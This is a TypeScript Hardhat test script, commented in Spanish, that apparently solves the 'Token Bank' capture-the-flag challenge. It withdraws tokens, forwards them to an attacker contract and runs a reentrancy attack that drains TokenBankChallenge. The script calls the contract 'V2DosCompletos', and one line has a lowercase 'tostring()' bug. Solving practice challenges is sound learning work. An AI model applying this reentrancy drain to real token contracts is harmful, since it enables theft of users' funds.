import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers";

let tokenBankContract: Contract;
let dosCompletosContract: Contract;
let simpleTokenContract: Contract;
let eoa: Signer;
const TOKEN_BANK_CHALLENGE_ADDRESS: string = "0x189A67FA88FFd01745A80598463B944B3bf69959"
const CONTRATO_ATACANTE_DOS_COMPLETOS_DESCONOCIDOS_ADDRESS: string = "0x011F4987c84cA738Cea2FBF17AE35Ae676E7E9B4"
const SIMPLE_TOKEN_CONTRACT_ADDRESS = "0xe50278D6d002e414b72Cca13C62c6222929dC52E";
const NUESTRO_BALANCE_DE_ARRANQUE = ethers.utils.parseEther(`500000`);

beforeEach(async () => {
  [eoa] = await ethers.getSigners();
  //Contrato del tokenBank
  const tokenBankFactory = await ethers.getContractFactory("TokenBankChallenge");
  tokenBankContract = tokenBankFactory.attach(TOKEN_BANK_CHALLENGE_ADDRESS);

  //Contrato del simpleToken
  const simpleTokenFactory = await ethers.getContractFactory("SimpleERC223Token");
  simpleTokenContract = simpleTokenFactory.attach(SIMPLE_TOKEN_CONTRACT_ADDRESS);

  //Contrato atacante que se robará hasta tu corazón bebe.
  const dosCompletosFactory = await ethers.getContractFactory("V2DosCompletos");
  dosCompletosContract = dosCompletosFactory.attach(CONTRATO_ATACANTE_DOS_COMPLETOS_DESCONOCIDOS_ADDRESS);
})

describe("Token Bank", async () => {
  it("Resuelve el Miscellaneous challenge - Token Bank", async () => {
    // Primero movemos los tokens desde el tokenBankContract a nuestra cuenta.    
    const txTokensDeChallengeHaciaEOA = await tokenBankContract.withdraw(NUESTRO_BALANCE_DE_ARRANQUE, {gasLimit:1e5});
    await txTokensDeChallengeHaciaEOA.wait();
    console.log("TOKENS TRANSFERIDOS A NUESTRA EOA");


    // Ahora notificamos al simpleTokenContract que transferimos tokens de nuestra cuenta al contrato DosCompletosDesconocidos. Recordemos que para entrar en reentrancy, transfer debe ser llamado desde un contrato, no una cuenta (por eso le pasamos el balance)
    const txTokensDeEOAHaciaDosCompletos = await simpleTokenContract[`transfer(address,uint256)`](
      CONTRATO_ATACANTE_DOS_COMPLETOS_DESCONOCIDOS_ADDRESS,
      NUESTRO_BALANCE_DE_ARRANQUE,
      { gasLimit: 1e5 }
    );
    await txTokensDeEOAHaciaDosCompletos.wait();
    console.log("TOKENS TRANSFERIDOS DE NUESTRA EOA A CONTRATO ATACANTE");
    // Ahora mandamos del contrato DosCompletosDesconocidos al contrato tokenBank, para que se registre nuestro balance.
    const txHabilitar = await dosCompletosContract.enable();
    await txHabilitar.wait();
    console.log("CONTRATO ATACANTE HABILITADO PARA TOKENFALLBACK");


    //#region Ataque + Demostracion por consola del balance 
    const dosCompletosBalancePreAtaque = await tokenBankContract.balanceOf(dosCompletosContract.address);
    console.log(`EL BALANCE PREVIO EN CONTRATO ATACANTE ES: `, dosCompletosBalancePreAtaque.toString());
    console.log(``);

    //Realizamos el ataque
    console.log(`INICIO DEL ATAQUE DE REENTRANCY A TokenBankChallenge...`);

    const txAtaqueDeReentrancy = await dosCompletosContract.attack({ gasLimit: 1e5 });
    await txAtaqueDeReentrancy.wait();

    const dosCompletosBalancePostAtaque = await tokenBankContract.balanceOf(dosCompletosContract.address);
    console.log(`ATAQUE FINALIZADO. NUEVO BALANCE EN CONTRATO ATACANTE: `, dosCompletosBalancePostAtaque.tostring());

    //#endregion Demostracion por consola del balance

    //Chequeo si isComplete es true
    let isComplete = await tokenBankContract.isComplete();
    expect(isComplete, "DESAFIO INCOMPLETO").to.be.true;
  })
})